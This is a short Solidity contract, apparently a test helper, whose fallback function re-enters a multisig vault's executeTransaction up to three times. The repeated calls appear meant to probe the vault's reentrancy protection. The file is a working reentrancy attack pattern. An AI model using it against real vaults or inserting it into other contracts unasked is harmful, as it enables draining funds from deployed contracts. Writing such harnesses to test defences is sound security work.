// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IMultiSigVault {
    function executeTransaction(uint256 _txIndex) external;
}

contract ReentrancyAttacker {
    address payable public vault;
    uint256 public targetTxIndex;
    uint256 public attackCount;

    event AttackAttempted(uint256 count);

    constructor(address payable _vault) {
        vault = _vault;
    }

    function setTargetTx(uint256 _txIndex) external {
        targetTxIndex = _txIndex;
    }

    fallback() external payable {
        if (attackCount < 3) {
            attackCount++;
            emit AttackAttempted(attackCount);
            IMultiSigVault(vault).executeTransaction(targetTxIndex);
        }
    }

    receive() external payable {}
}